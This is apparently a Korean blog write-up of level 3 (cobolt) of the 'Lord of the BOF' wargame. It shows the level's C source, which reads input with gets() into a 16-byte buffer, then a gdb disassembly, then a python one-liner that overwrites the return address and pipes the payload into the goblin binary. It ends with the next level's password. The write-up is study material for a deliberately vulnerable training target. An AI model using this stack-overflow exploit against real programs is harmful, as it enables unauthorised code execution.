---
title: "BOF - Lv.3 cobolt"
excerpt: "Lv.3 cobolt"
toc: true
toc_sticky: true
categories:
  - BOF
tags:
  - stack buffer overflow
---

## 1. Source Code
```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - goblin
        - small buffer + stdin
*/

int main()
{
    char buffer[16];
    gets(buffer);
    printf("%s\n", buffer);
}
```
```
(gdb)
0x80483f8 <main>:       push   %ebp
0x80483f9 <main+1>:     mov    %ebp,%esp
0x80483fb <main+3>:     sub    %esp,16
0x80483fe <main+6>:     lea    %eax,[%ebp-16]
0x8048401 <main+9>:     push   %eax
0x8048402 <main+10>:    call   0x804830c <gets>
0x8048407 <main+15>:    add    %esp,4
0x804840a <main+18>:    lea    %eax,[%ebp-16]
0x804840d <main+21>:    push   %eax
0x804840e <main+22>:    push   0x8048470
0x8048413 <main+27>:    call   0x804833c <printf>
0x8048418 <main+32>:    add    %esp,8
0x804841b <main+35>:    leave
0x804841c <main+36>:    ret
```

## 2. Vulnerability
코드를 보면 gets 함수를 사용함. strcpy()와 같은 이유로 버퍼 오버플로 취약점 발생함. 그리고 버퍼 크기고 작으므로 마찬가지로 환경변수를 이용함.

## 3. Solution
gets 함수는 입력값을 직접 받는 함수기 때문에 strcpy와는 달리 입력값을 주고 파이프```|```로 그 값을 cobolt에 줘야함.  
```
(python -c 'print "A"*20+"\x0e\xfc\xff\xbf"'; cat) | ./goblin
``` 
my-pass : hackers proof